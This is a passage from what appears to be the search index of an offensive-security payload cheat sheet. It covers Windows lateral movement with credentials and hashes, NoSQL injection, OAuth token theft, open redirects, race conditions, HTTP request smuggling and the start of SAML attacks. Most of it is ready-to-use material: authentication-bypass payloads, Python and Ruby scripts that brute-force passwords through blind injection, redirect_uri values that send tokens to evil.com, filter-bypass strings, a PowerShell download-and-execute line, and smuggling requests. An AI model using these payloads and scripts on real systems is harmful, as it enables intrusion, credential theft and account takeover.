[-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]\nevil-winrm -i 10.0.0.20 -u username -H HASH\nevil-winrm -i 10.0.0.20 -u username -p password -r domain.local\n*Evil-WinRM* PS &gt; Bypass-4MSI\n*Evil-WinRM* PS &gt; IEX([Net.Webclient]::new().DownloadString(\"http://127.0.0.1/PowerView.ps1\"))\n</code></pre></p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#wmi-protocol","title":"WMI Protocol","text":"<pre><code>PS C:\\&gt; wmic /node:target.domain /user:domain\\user /password:password process call create \"C:\\Windows\\System32\\calc.exe\u201d\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#ssh-protocol","title":"SSH Protocol","text":"<p> You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!)</p> <pre><code>cp user.ccache /tmp/krb5cc_1045\nssh -o GSSAPIAuthentication=yes user@domain.local -vv\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#other-methods","title":"Other methods","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#psexec-sysinternal","title":"PsExec - Sysinternal","text":"<p>From Windows - Sysinternal</p> <pre><code>PS C:\\&gt; PsExec.exe  \\\\srv01.domain.local -u DOMAIN\\username -p password cmd.exe\n# switch admin user to NT Authority/System\nPS C:\\&gt; PsExec.exe  \\\\srv01.domain.local -u DOMAIN\\username -p password cmd.exe -s \n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#mount-a-remote-share","title":"Mount a remote share","text":"<pre><code>PS C:\\&gt; net use \\\\srv01.domain.local /user:DOMAIN\\username password C$\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#runas-as-another-user","title":"Runas as another user","text":"<p>Runas is a command-line tool that is built into Windows Vista. Allows a user to run specific tools and programs with different permissions than the user's current logon provides.</p> <pre><code>PS C:\\&gt; runas /netonly /user:DOMAIN\\username \"cmd.exe\"\nPS C:\\&gt; runas /noprofil /netonly /user:DOMAIN\\username cmd.exe\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#references","title":"References","text":"<ul> <li>Ropnop - Using credentials to own Windows boxes</li> <li>Ropnop - Using credentials to own Windows boxes Part 2</li> <li>Gaining Domain Admin from Outside Active Directory</li> <li>Impacket Remote code execution on Windows from Linux by Vry4n_ - Jun 20, 2021</li> <li>Impacket Exec Commands Cheat Sheet - 13cubed</li> <li>SMB protocol cheatsheet - aas-s3curity</li> <li>Windows Lateral Movement with smb, psexec and alternatives - nv2lt</li> <li>PsExec.exe IOCs and Detection - Threatexpress</li> <li>A Dive on SMBEXEC - dmcxblue - 8th Feb 2021</li> </ul>"},{"location":"NoSQL%20Injection/","title":"NoSQL Injection","text":"<p>NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.</p>"},{"location":"NoSQL%20Injection/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Exploit</li> <li>Authentication Bypass</li> <li>Extract length information</li> <li>Extract data information</li> <li>Blind NoSQL</li> <li>POST with JSON body</li> <li>POST with urlencoded body</li> <li>GET</li> <li>MongoDB Payloads</li> <li>References</li> </ul>"},{"location":"NoSQL%20Injection/#tools","title":"Tools","text":"<ul> <li>NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool</li> <li>nosqlilab - A lab for playing with NoSQL Injection</li> <li>Burp-NoSQLiScanner - Plugin available in burpsuite </li> </ul>"},{"location":"NoSQL%20Injection/#exploit","title":"Exploit","text":""},{"location":"NoSQL%20Injection/#authentication-bypass","title":"Authentication Bypass","text":"<p>Basic authentication bypass using not equal ($ne) or greater ($gt)</p> <pre><code>in DATA\nusername[$ne]=toto&amp;password[$ne]=toto\nlogin[$regex]=a.*&amp;pass[$ne]=lol\nlogin[$gt]=admin&amp;login[$lt]=test&amp;pass[$ne]=1\nlogin[$nin][]=admin&amp;login[$nin][]=test&amp;pass[$ne]=toto\nin JSON\n{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}\n{\"username\": {\"$ne\": \"foo\"}, \"password\": {\"$ne\": \"bar\"}}\n{\"username\": {\"$gt\": undefined}, \"password\": {\"$gt\": undefined}}\n{\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}}\n</code></pre>"},{"location":"NoSQL%20Injection/#extract-length-information","title":"Extract length information","text":"<pre><code>username[$ne]=toto&amp;password[$regex]=.{1}\nusername[$ne]=toto&amp;password[$regex]=.{3}\n</code></pre>"},{"location":"NoSQL%20Injection/#extract-data-information","title":"Extract data information","text":"<pre><code>in URL\nusername[$ne]=toto&amp;password[$regex]=m.{2}\nusername[$ne]=toto&amp;password[$regex]=md.{1}\nusername[$ne]=toto&amp;password[$regex]=mdp\nusername[$ne]=toto&amp;password[$regex]=m.*\nusername[$ne]=toto&amp;password[$regex]=md.*\nin JSON\n{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^m\" }}\n{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^md\" }}\n{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^mdp\" }}\n</code></pre> <p>Extract data with \"in\"</p> <pre><code>{\"username\":{\"$in\":[\"Admin\", \"4dm1n\", \"admin\", \"root\", \"administrator\"]},\"password\":{\"$gt\":\"\"}}\n</code></pre>"},{"location":"NoSQL%20Injection/#ssji","title":"SSJI","text":"<pre><code>';return 'a'=='a' &amp;&amp; ''=='\n\";return 'a'=='a' &amp;&amp; ''=='\n0;return true\n</code></pre>"},{"location":"NoSQL%20Injection/#blind-nosql","title":"Blind NoSQL","text":""},{"location":"NoSQL%20Injection/#post-with-json-body","title":"POST with JSON body","text":"<p>python script:</p> <pre><code>import requests\nimport urllib3\nimport string\nimport urllib\nurllib3.disable_warnings()\nusername=\"admin\"\npassword=\"\"\nu=\"http://example.org/login\"\nheaders={'content-type': 'application/json'}\nwhile True:\nfor c in string.printable:\nif c not in ['*','+','.','?','|']:\npayload='{\"username\": {\"$eq\": \"%s\"}, \"password\": {\"$regex\": \"^%s\" }}' % (username, password + c)\nr = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)\nif 'OK' in r.text or r.status_code == 302:\nprint(\"Found one more char : %s\" % (password+c))\npassword += c\n</code></pre>"},{"location":"NoSQL%20Injection/#post-with-urlencoded-body","title":"POST with urlencoded body","text":"<p>python script:</p> <pre><code>import requests\nimport urllib3\nimport string\nimport urllib\nurllib3.disable_warnings()\nusername=\"admin\"\npassword=\"\"\nu=\"http://example.org/login\"\nheaders={'content-type': 'application/x-www-form-urlencoded'}\nwhile True:\nfor c in string.printable:\nif c not in ['*','+','.','?','|','&amp;','$']:\npayload='user=%s&amp;pass[$regex]=^%s&amp;remember=on' % (username, password + c)\nr = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)\nif r.status_code == 302 and r.headers['Location'] == '/dashboard':\nprint(\"Found one more char : %s\" % (password+c))\npassword += c\n</code></pre>"},{"location":"NoSQL%20Injection/#get","title":"GET","text":"<p>python script:</p> <pre><code>import requests\nimport urllib3\nimport string\nimport urllib\nurllib3.disable_warnings()\nusername='admin'\npassword=''\nu='http://example.org/login'\nwhile True:\nfor c in string.printable:\nif c not in ['*','+','.','?','|', '#', '&amp;', '$']:\npayload=f\"?username={username}&amp;password[$regex]=^{password + c}\"\nr = requests.get(u + payload)\nif 'Yeah' in r.text:\nprint(f\"Found one more char : {password+c}\")\npassword += c\n</code></pre> <p>ruby script:</p> <pre><code>require 'httpx'\nusername = 'admin'\npassword = ''\nurl = 'http://example.org/login'\n# CHARSET = (?!..?~).to_a # all ASCII printable characters\nCHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'\nGET_EXCLUDE = ['*','+','.','?','|', '#', '&amp;', '$']\nsession = HTTPX.plugin(:persistent)\nwhile true\nCHARSET.each do |c|\nunless GET_EXCLUDE.include?(c)\npayload = \"?username=#{username}&amp;password[$regex]=^#{password + c}\"\nres = session.get(url + payload)\nif res.body.to_s.match?('Yeah')\nputs \"Found one more char : #{password + c}\"\npassword += c\nend\nend\nend\nend\n</code></pre>"},{"location":"NoSQL%20Injection/#mongodb-payloads","title":"MongoDB Payloads","text":"<pre><code>true, $where: '1 == 1'\n, $where: '1 == 1'\n$where: '1 == 1'\n', $where: '1 == 1'\n1, $where: '1 == 1'\n{ $ne: 1 }\n', $or: [ {}, { 'a':'a\n' } ], $comment:'successful MongoDB injection'\ndb.injection.insert({success:1});\ndb.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1\n|| 1==1\n' &amp;&amp; this.password.match(/.*/)//+%00\n' &amp;&amp; this.passwordzz.match(/.*/)//+%00\n'%20%26%26%20this.password.match(/.*/)//+%00\n'%20%26%26%20this.passwordzz.match(/.*/)//+%00\n{$gt: ''}\n[$ne]=1\n';return 'a'=='a' &amp;&amp; ''=='\n\";return(true);var xyz='a\n0;return true\n</code></pre>"},{"location":"NoSQL%20Injection/#references","title":"References","text":"<ul> <li>Les NOSQL injections Classique et Blind: Never trust user input - Geluchat</li> <li>Testing for NoSQL injection - OWASP/WSTG</li> <li>NoSQL injection wordlists - cr0hn</li> <li>NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon</li> <li>Burp-NoSQLiScanner</li> </ul>"},{"location":"OAuth%20Misconfiguration/","title":"OAuth Misconfiguration","text":""},{"location":"OAuth%20Misconfiguration/#summary","title":"Summary","text":"<ul> <li>Stealing OAuth Token via referer</li> <li>Grabbing OAuth Token via redirect_uri</li> <li>Executing XSS via redirect_uri</li> <li>OAuth private key disclosure</li> <li>Authorization Code Rule Violation</li> <li>Cross-Site Request Forgery</li> <li>References</li> </ul>"},{"location":"OAuth%20Misconfiguration/#stealing-oauth-token-via-referer","title":"Stealing OAuth Token via referer","text":"<p>From @abugzlife1 tweet.</p> <p>Do you have HTML injection but can't get XSS? Are there any OAuth implementations on the site? If so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login to steal OAuth tokens via referer </p>"},{"location":"OAuth%20Misconfiguration/#grabbing-oauth-token-via-redirect_uri","title":"Grabbing OAuth Token via redirect_uri","text":"<p>Redirect to a controlled domain to get the access token</p> <pre><code>https://www.example.com/signin/authorize?[...]&amp;redirect_uri=https://demo.example.com/loginsuccessful\nhttps://www.example.com/signin/authorize?[...]&amp;redirect_uri=https://localhost.evil.com\n</code></pre> <p>Redirect to an accepted Open URL in to get the access token</p> <pre><code>https://www.example.com/oauth20_authorize.srf?[...]&amp;redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com\nhttps://www.example.com/oauth2/authorize?[...]&amp;redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F\n</code></pre> <p>OAuth implementations should never whitelist entire domains, only a few URLs so that \u201credirect_uri\u201d can\u2019t be pointed to an Open Redirect.</p> <p>Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:</p> <pre><code>https://www.example.com/admin/oauth/authorize?[...]&amp;scope=a&amp;redirect_uri=https://evil.com\n</code></pre>"},{"location":"OAuth%20Misconfiguration/#executing-xss-via-redirect_uri","title":"Executing XSS via redirect_uri","text":"<pre><code>https://example.com/oauth/v1/authorize?[...]&amp;redirect_uri=data%3Atext%2Fhtml%2Ca&amp;state=&lt;script&gt;alert('XSS')&lt;/script&gt;\n</code></pre>"},{"location":"OAuth%20Misconfiguration/#oauth-private-key-disclosure","title":"OAuth private key disclosure","text":"<p>Some Android/iOS app can be decompiled and the OAuth Private key can be accessed.</p>"},{"location":"OAuth%20Misconfiguration/#authorization-code-rule-violation","title":"Authorization Code Rule Violation","text":"<p>The client MUST NOT use the authorization code  more than once. If an authorization code is used more than once, the authorization server MUST deny the request  and SHOULD revoke (when possible) all tokens previously issued based on that authorization code.</p>"},{"location":"OAuth%20Misconfiguration/#cross-site-request-forgery","title":"Cross-Site Request Forgery","text":"<p>Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback (<code>https://example.com/callback?code=AUTHORIZATION_CODE</code>). This URL can be used in CSRF attacks.</p> <p>The client MUST implement CSRF protection for its redirection URI. This is typically accomplished by requiring any request sent to the redirection URI endpoint to include a value that binds the request to the user-agent's authenticated state. The client SHOULD utilize the \"state\" request parameter to deliver this value to the authorization server when making an authorization request.</p>"},{"location":"OAuth%20Misconfiguration/#labs","title":"Labs","text":"<ul> <li>Authentication bypass via OAuth implicit flow</li> <li>Forced OAuth profile linking</li> <li>OAuth account hijacking via redirect_uri</li> <li>Stealing OAuth access tokens via a proxy page</li> <li>Stealing OAuth access tokens via an open redirect</li> </ul>"},{"location":"OAuth%20Misconfiguration/#references","title":"References","text":"<ul> <li>All your Paypal OAuth tokens belong to me - localhost for the win - INTO THE SYMMETRY</li> <li>OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - INTO THE SYMMETRY</li> <li>How I hacked Github again. - Egor Homakov</li> <li>How Microsoft is giving your data to Facebook\u2026 and everyone else - Andris Atteka</li> <li>Bypassing Google Authentication on Periscope's Administration Panel By Jack Whitton</li> </ul>"},{"location":"Open%20Redirect/","title":"Open URL Redirection","text":"<p>Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application\u2019s access control check and then forward the attacker to privileged functions that they would normally not be able to access.</p>"},{"location":"Open%20Redirect/#summary","title":"Summary","text":"<ul> <li>Open URL Redirection</li> <li>Summary</li> <li>Exploitation</li> <li>HTTP Redirection Status Code - 3xx</li> <li>Fuzzing</li> <li>Filter Bypass</li> <li>Common injection parameters</li> <li>References</li> </ul>"},{"location":"Open%20Redirect/#exploitation","title":"Exploitation","text":"<p>Let\u2019s say there\u2019s a <code>well known</code> website - https://famous-website.tld/. And let's assume that there's a link like :</p> <p><pre><code>https://famous-website.tld/signup?redirectUrl=https://famous-website.tld/account\n</code></pre> After signing up you get redirected to your account, this redirection is specified by the <code>redirectUrl</code> parameter in the URL.  What happens if we change the <code>famous-website.tld/account</code> to <code>evil-website.tld</code>?</p> <pre><code>https://famous-website.tld/signup?redirectUrl=https://evil-website.tld/account\n</code></pre> <p>By visiting this url, if we get redirected to <code>evil-website.tld</code> after the sign-up, we have an Open Redirect vulnerability. This can be abused by an attacker to display a phishing page asking you to enter your credentials.</p>"},{"location":"Open%20Redirect/#http-redirection-status-code-3xx","title":"HTTP Redirection Status Code - 3xx","text":"<ul> <li>300 Multiple Choices</li> <li>301 Moved Permanently</li> <li>302 Found</li> <li>303 See Other</li> <li>304 Not Modified</li> <li>305 Use Proxy</li> <li>307 Temporary Redirect</li> <li>308 Permanent Redirect</li> </ul>"},{"location":"Open%20Redirect/#fuzzing","title":"Fuzzing","text":"<p>Replace www.whitelisteddomain.tld from Open-Redirect-payloads.txt with a specific white listed domain in your test case</p> <p>To do this simply modify the WHITELISTEDDOMAIN with value www.test.com to your test case URL.</p> <pre><code>WHITELISTEDDOMAIN=\"www.test.com\" &amp;&amp; sed 's/www.whitelisteddomain.tld/'\"$WHITELISTEDDOMAIN\"'/' Open-Redirect-payloads.txt &gt; Open-Redirect-payloads-burp-\"$WHITELISTEDDOMAIN\".txt &amp;&amp; echo \"$WHITELISTEDDOMAIN\" | awk -F. '{print \"https://\"$0\".\"$NF}' &gt;&gt; Open-Redirect-payloads-burp-\"$WHITELISTEDDOMAIN\".txt\n</code></pre>"},{"location":"Open%20Redirect/#filter-bypass","title":"Filter Bypass","text":"<p>Using a whitelisted domain or keyword</p> <pre><code>www.whitelisted.com.evil.com redirect to evil.com\n</code></pre> <p>Using CRLF to bypass \"javascript\" blacklisted keyword</p> <pre><code>java%0d%0ascript%0d%0a:alert(0)\n</code></pre> <p>Using \"//\" &amp; \"////\" to bypass \"http\" blacklisted keyword</p> <pre><code>//google.com\n////google.com\n</code></pre> <p>Using \"https:\" to bypass \"//\" blacklisted keyword</p> <pre><code>https:google.com\n</code></pre> <p>Using \"\\/\\/\" to bypass \"//\" blacklisted keyword (Browsers see \\/\\/ as //)</p> <pre><code>\\/\\/google.com/\n/\\/google.com/\n</code></pre> <p>Using \"%E3%80%82\" to bypass \".\" blacklisted character</p> <pre><code>/?redir=google\u3002com\n//google%E3%80%82com\n</code></pre> <p>Using null byte \"%00\" to bypass blacklist filter</p> <pre><code>//google%00.com\n</code></pre> <p>Using parameter pollution</p> <pre><code>?next=whitelisted.com&amp;next=google.com\n</code></pre> <p>Using \"@\" character, browser will redirect to anything after the \"@\"</p> <pre><code>http://www.theirsite.com@yoursite.com/\n</code></pre> <p>Creating folder as their domain</p> <pre><code>http://www.yoursite.com/http://www.theirsite.com/\nhttp://www.yoursite.com/folder/www.folder.com\n</code></pre> <p>Using \"?\" characted, browser will translate it to \"/?\"</p> <pre><code>http://www.yoursite.com?http://www.theirsite.com/\nhttp://www.yoursite.com?folder/www.folder.com\n</code></pre> <p>Host/Split Unicode Normalization <pre><code>https://evil.c\u2100.example.com . ---&gt; https://evil.ca/c.example.com\nhttp://a.com\uff0fX.b.com\n</code></pre></p> <p>XSS from Open URL - If it's in a JS variable</p> <pre><code>\";alert(0);//\n</code></pre> <p>XSS from data:// wrapper</p> <pre><code>http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==\n</code></pre> <p>XSS from javascript:// wrapper</p> <pre><code>http://www.example.com/redirect.php?url=javascript:prompt(1)\n</code></pre>"},{"location":"Open%20Redirect/#common-injection-parameters","title":"Common injection parameters","text":"<pre><code>/{payload}\n?next={payload}\n?url={payload}\n?target={payload}\n?rurl={payload}\n?dest={payload}\n?destination={payload}\n?redir={payload}\n?redirect_uri={payload}\n?redirect_url={payload}\n?redirect={payload}\n/redirect/{payload}\n/cgi-bin/redirect.cgi?{payload}\n/out/{payload}\n/out?{payload}\n?view={payload}\n/login?to={payload}\n?image_url={payload}\n?go={payload}\n?return={payload}\n?returnTo={payload}\n?return_to={payload}\n?checkout_url={payload}\n?continue={payload}\n?return_path={payload}\n</code></pre>"},{"location":"Open%20Redirect/#labs","title":"Labs","text":"<ul> <li>DOM-based open redirection</li> </ul>"},{"location":"Open%20Redirect/#references","title":"References","text":"<ul> <li>filedescriptor</li> <li>You do not need to run 80 reconnaissance tools to get access to user accounts - @stefanocoding</li> <li>OWASP - Unvalidated Redirects and Forwards Cheat Sheet</li> <li>Cujanovic - Open-Redirect-Payloads</li> <li>Pentester Land - Open Redirect Cheat Sheet</li> <li>Open Redirect Vulnerability - AUGUST 15, 2018 - s0cket7</li> <li>Host/Split Exploitable Antipatterns in Unicode Normalization - BlackHat US 2019</li> </ul>"},{"location":"Race%20Condition/","title":"Race Condition","text":"<p>Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language. </p>"},{"location":"Race%20Condition/#summary","title":"Summary","text":"<ul> <li>Race Condition</li> <li>Summary</li> <li>Tools</li> <li>Turbo Intruder Examples</li> <li>Turbo Intruder 2 Requests Examples</li> <li>References</li> </ul>"},{"location":"Race%20Condition/#tools","title":"Tools","text":"<ul> <li>Turbo Intruder - a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results.</li> </ul>"},{"location":"Race%20Condition/#turbo-intruder-examples","title":"Turbo Intruder Examples","text":"<ol> <li>Send request to turbo intruder</li> <li>Use this python code as a payload of the turbo intruder     <pre><code>def queueRequests(target, wordlists):\nengine = RequestEngine(endpoint=target.endpoint,\nconcurrentConnections=30,\nrequestsPerConnection=30,\npipeline=False\n)\nfor i in range(30):\nengine.queue(target.req, i)\nengine.queue(target.req, target.baseInput, gate='race1')\nengine.start(timeout=5)\nengine.openGate('race1')\nengine.complete(timeout=60)\ndef handleResponse(req, interesting):\ntable.add(req)\n</code></pre></li> <li>Now set the external HTTP header x-request: %s -  This is needed by the turbo intruder</li> <li>Click \"Attack\"</li> </ol>"},{"location":"Race%20Condition/#turbo-intruder-2-requests-examples","title":"Turbo Intruder 2 Requests Examples","text":"<p>This following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds. <pre><code>def queueRequests(target, wordlists): \nengine = RequestEngine(endpoint=target.endpoint, \nconcurrentConnections=30, \nrequestsPerConnection=100, \npipeline=False \n) \nrequest1 = '''\nPOST /target-URI-1 HTTP/1.1\nHost: &lt;REDACTED&gt;\nCookie: session=&lt;REDACTED&gt;\nparameterName=parameterValue\n    ''' \nrequest2 = '''\nGET /target-URI-2 HTTP/1.1\nHost: &lt;REDACTED&gt;\nCookie: session=&lt;REDACTED&gt;\n    '''\nengine.queue(request1, gate='race1')\nfor i in range(30): \nengine.queue(request2, gate='race1') \nengine.openGate('race1') \nengine.complete(timeout=60) \ndef handleResponse(req, interesting): \ntable.add(req)\n</code></pre></p>"},{"location":"Race%20Condition/#references","title":"References","text":"<ul> <li>Race Condition allows to redeem multiple times gift cards which leads to free \"money\" - @muon4</li> <li>Turbo Intruder: Embracing the billion-request attack - James Kettle | 25 January 2019</li> <li>Race Condition Bug In Web App: A Use Case - Mandeep Jadon</li> </ul>"},{"location":"Request%20Smuggling/","title":"Request Smuggling","text":"<p>HTTP Request smuggling occurs when multiple \"things\" process a request, but differ on how they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests from a newer protocol, or due to differences in when a partial request has timed out and should be discarded.</p>"},{"location":"Request%20Smuggling/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>CL.TE vulnerabilities</li> <li>TE.CL vulnerabilities</li> <li>TE.TE behavior: obfuscating the TE header</li> <li>References</li> </ul>"},{"location":"Request%20Smuggling/#tools","title":"Tools","text":"<ul> <li>HTTP Request Smuggler / BApp Store</li> <li>Smuggler</li> <li>Simple HTTP Smuggler Generator CL.TE TE.CL &gt; this tool does not offer automated exploitation. You have to identify the injection point and exploit it manually!</li> </ul>"},{"location":"Request%20Smuggling/#about-clte-tecl-vulnerabilities","title":"About CL.TE | TE.CL Vulnerabilities","text":"<p>If you want to exploit HTTP Requests Smuggling manually you will face some problems especially in TE.CL vulnerability you have to calculate the chunk size for the second request(malicious request) as portswigger suggests <code>Manually fixing the length fields in request smuggling attacks can be tricky.</code>. For that reason you can use the Simple HTTP Smuggler Generator CL.TE TE.CL and exploit the CL.TE TE.CL vulnerabilities manually and learn how this vulnerability works and how you can exploit it. This tool offers you only the second request with a valid chunk size(TE.CL) auto-generated but does not offer automated exploitation. You have to identify the injection point and exploit it manually!</p>"},{"location":"Request%20Smuggling/#clte-vulnerabilities","title":"CL.TE vulnerabilities","text":"<p>The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.</p> <pre><code>POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 13\nTransfer-Encoding: chunked\n0\nSMUGGLED\n</code></pre> <p>Example:</p> <pre><code>POST / HTTP/1.1\nHost: domain.example.com\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n0\nG\n</code></pre> <p>Challenge: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</p>"},{"location":"Request%20Smuggling/#tecl-vulnerabilities","title":"TE.CL vulnerabilities","text":"<p>The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. </p> <pre><code>POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 3\nTransfer-Encoding: chunked\n8\nSMUGGLED\n0\n</code></pre> <p>Example:</p> <pre><code>POST / HTTP/1.1\nHost: domain.example.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86\nContent-Length: 4\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n5c\nGPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\nx=1\n0\n</code></pre> <p> To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the \"Update Content-Length\" option is unchecked.You need to include the trailing sequence \\r\\n\\r\\n following the final 0.</p> <p>Challenge: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</p>"},{"location":"Request%20Smuggling/#tete-behavior-obfuscating-the-te-header","title":"TE.TE behavior: obfuscating the TE header","text":"<p>The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.</p> <pre><code>Transfer-Encoding: xchunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding:[tab]chunked\n[space]Transfer-Encoding: chunked\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n: chunked\n</code></pre> <p>Challenge: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</p>"},{"location":"Request%20Smuggling/#http2-request-smuggling","title":"HTTP/2 Request Smuggling","text":"<p>HTTP/2 request smuggling can occur if a machine converts your HTTP/2 request to HTTP/1.1, and you can smuggle an invalid content-length header, transfer-encoding header or new lines (CRLF) into the translated request. HTTP/2 request smuggling can also occur in a GET request, if you can hide an HTTP/1.1 request inside an HTTP/2 header</p> <pre><code>:method GET\n:path /\n:authority www.example.com\nheader ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com\n</code></pre> <p>Challenge: https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling</p>"},{"location":"Request%20Smuggling/#client-side-desync","title":"Client-side desync","text":"<p>On some paths, servers don't expect POST requests, and will treat them as simple GET requests, ignoring the payload, eg:</p> <pre><code>POST / HTTP/1.1\nHost: www.example.com\nContent-Length: 37\n\nGET / HTTP/1.1\nHost: www.example.com\n</code></pre> <p>could be treated as two requests when it should only be one. When the backend server responds twice, the frontend server will assume only the first response is related to this request.</p> <p>To exploit this, an attacker can use JavaScript to trigger their victim to send a POST to the vulnerable site:</p> <pre><code>fetch('https://www.example.com/', {method: 'POST', body: \"GET / HTTP/1.1\\r\\nHost: www.example.com\", mode: 'no-cors', credentials: 'include'} )\n</code></pre> <p>This could be used to:</p> <ul> <li>get the vulnerable site to store a victim's credentials somewhere the attacker can access it</li> <li>get the victim to send an exploit to a site (eg for internal sites the attacker cannot access, or to make it harder to attribute the attack)</li> <li>to get the victim to run arbitrary JavaScript as if it were from the site</li> </ul> <p>Eg: <pre><code>fetch('https://www.example.com/redirect', {\nmethod: 'POST',\nbody: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1\\r\\nX: Y`,\ncredentials: 'include',\nmode: 'cors' // throw an error instead of following redirect\n}).catch(() =&gt; {\nlocation = 'https://www.example.com/'\n})\n</code></pre></p> <p>tells the victim browser to send a POST request to www.example.com/redirect. That returns a redirect which is blocked by CORS, and causes the browser to execute the catch block, by going to www.example.com. </p> <p>www.example.com now incorrectly processes the HEAD request in the POST's body, instead of the browser's GET request, and returns 404 not found with a content-length, before replying to the next misinterpreted third (<code>GET /x?x=&lt;script&gt;...</code>) request and finally the browser's actual GET request. Since the browser only sent one request, it accepts the response to the HEAD request as the response to its GET request and interprets the third and fourth responses as the body of the response, and thus executes the attacker's script.</p> <p>Challenge: https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync</p>"},{"location":"Request%20Smuggling/#references","title":"References","text":"<ul> <li>PortSwigger - Request Smuggling Tutorial and PortSwigger - Request Smuggling Reborn</li> <li>A Pentester's Guide to HTTP Request Smuggling - Busra Demir - 2020, October 16</li> <li>Advanced Request Smuggling - PortSwigger</li> <li>Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling - James Kettle - 10 August 2022</li> </ul>"},{"location":"SAML%20Injection/","title":"SAML Injection","text":"<p>Security Assertion Markup Language (SAML) is an open standard that allows security credentials to be shared by multiple computers across a network. When using SAML-based Single Sign-On (SSO), three distinct parties are involved. There is a user (the so-called principal), an IDentity Provider (IDP), and a cloud application Service Provider (SP).  - centrify</p>"},{"location":"SAML%20Injection/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Authentication Bypass</li> <li>Invalid Signature</li> <li>Signature Stripping</li> <li>XML Signature Wrapping Attacks</li> <li>XML Comment Handling</li> <li>XML External Entity</li> <li>Extensible Stylesheet Language Transformation</li> </ul>"},{"location":"SAML%20Injection/#tools","title":"Tools","text":"<ul> <li>SAML Raider - Burp Extension</li> <li>SAML Support - ZAP Addon</li> </ul>"},{"location":"SAML%20Injection/#authentication-bypass","title":"Authentication Bypass","text":"<p>A SAML Response should contain the <code>&lt;samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"</code>.</p>"},{"location":"SAML%20Injection/#invalid-signature","title":"Invalid Signature","text":"<p>Signatures which are not signed by a real CA are prone to cloning. Ensure the signature is signed by a real CA. If the certificate is self-signed, you may be able to clone the certificate or create your own self-signed certificate to replace it.</p>"},{"location":"SAML%20Injection/#signature-stripping","title":"Signature 